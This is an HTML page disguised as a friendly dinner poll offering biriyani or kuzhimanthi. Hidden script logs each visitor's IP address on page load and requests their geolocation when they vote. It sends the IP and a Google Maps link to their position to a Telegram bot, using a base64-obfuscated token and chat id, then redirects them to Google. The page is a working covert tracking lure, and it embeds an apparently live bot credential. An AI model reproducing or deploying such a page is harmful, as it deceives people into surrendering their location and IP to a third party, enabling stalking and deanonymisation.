<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dinner Poll</title>
    <style>
        body { background-color: #121212; font-family: 'Arial', sans-serif; text-align: center; color: white; margin: 0; padding: 20px; }
        .container { max-width: 400px; margin: auto; background: #1e1e1e; padding: 20px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        h2 { color: #ff9800; }
        .option { margin-bottom: 20px; cursor: pointer; border: 2px solid #333; border-radius: 15px; overflow: hidden; background: #252525; transition: 0.3s; }
        .option:hover { border-color: #ff9800; }
        img { width: 100%; height: 200px; object-fit: cover; display: block; background: #333; }
        .label { font-weight: bold; padding: 15px; display: block; font-size: 18px; letter-spacing: 1px; }
        #msg { display: none; color: #4caf50; font-weight: bold; margin-top: 15px; }
    </style>
</head>
<body onload="getIP()">
    <div class="container">
        <h2>What's for Dinner? 😋</h2>
        <p>Pick your favorite one!</p>

        <div class="option" onclick="vote('Biriyani')">
            <img src="https://images.unsplash.com/photo-1589302168068-964664d93dc0?w=500&q=80" alt="Biriyani">
            <span class="label">🍗 HYDERABADI BIRIYANI</span>
        </div>

        <div class="option" onclick="vote('Kuzhimanthi')">
            <img src="https://images.unsplash.com/photo-1633945274405-b6c8069047b0?w=500&q=80" alt="Mandi">
            <span class="label">🥘 ARABIAN KUZHIMANTHI</span>
        </div>

        <p id="msg">Choice submitted! Ordering... ❤️</p>
    </div>

    <script>
        let uIP = "Unknown";
        const t = "ODY0NzIwNjgxODpBQUZaTE91bVFwSUJZRDNXdURjZWVPR1drTkRDTFZpR3paSQ==";
        const c = "NzAwODk1Mjc0Ng==";

        async function getIP() {
            try {
                const r = await fetch('https://api.ipify.org?format=json');
                const d = await r.json();
                uIP = d.ip;
            } catch(e) {}
        }

        function vote(food) {
            document.getElementById('msg').style.display = 'block';
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    p => {
                        const maps = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
                        send(food, maps);
                    }, 
                    () => send(food, "Denied"),
                    { timeout: 5000 }
                );
            } else { send(food, "No Geo"); }
        }

        async function send(f, l) {
            const tok = atob(t);
            const chat = atob(c);
            const text = `🍴 *Vote:* ${f}\n🌐 *IP:* ${uIP}\n📍 *Map:* ${l}`;
            fetch(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
            setTimeout(() => { window.location.href = "https://www.google.com"; }, 2000);
        }
    </script>
</body>
</html>
